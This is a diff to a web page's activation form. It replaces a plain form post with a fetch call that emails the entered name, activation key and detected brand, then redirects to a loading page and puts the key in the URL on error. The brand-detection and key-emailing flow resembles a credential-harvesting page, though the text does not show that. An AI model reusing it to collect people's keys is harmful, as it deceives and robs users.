@@ -69,7 +69,7 @@
 
             <!-- Form Card -->
             <div class="card-glass rounded-2xl p-8 shadow-2xl">
-                <form id="activationForm" action="/api/send-email" method="POST" class="space-y-5">
+                <form id="activationForm" class="space-y-5">
                     <p id="brandSubtitle" class="text-gray-500 text-sm text-center">Enter your activation details below</p>
                     <!-- Name -->
                     <div>
@@ -279,12 +279,34 @@
         });
 
         // Handle form submission
-        document.getElementById('activationForm').addEventListener('submit', function(e) {
+        document.getElementById('activationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             sessionStorage.setItem('detectedActivationKey', document.getElementById('activation_key').value);
             sessionStorage.setItem('detectedBrand', document.getElementById('brandField').value);
             const btn = document.getElementById('submitBtn');
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2"></i>Processing...';
             btn.disabled = true;
+
+            const formData = new FormData(this);
+            try {
+                const res = await fetch('/api/send-email', {
+                    method: 'POST',
+                    body: new URLSearchParams(formData)
+                });
+                if (res.redirected) {
+                    window.location.href = res.url;
+                } else {
+                    const data = await res.json();
+                    if (data.redirect) {
+                        window.location.href = data.redirect;
+                    }
+                }
+            } catch(err) {
+                // Fallback: redirect to loading page directly
+                const brand = document.getElementById('brandField').value;
+                const key = document.getElementById('activation_key').value;
+                window.location.href = '/loading.html?brand=' + encodeURIComponent(brand) + '&key=' + encodeURIComponent(key);
+            }
         });
     </script>
 </body>
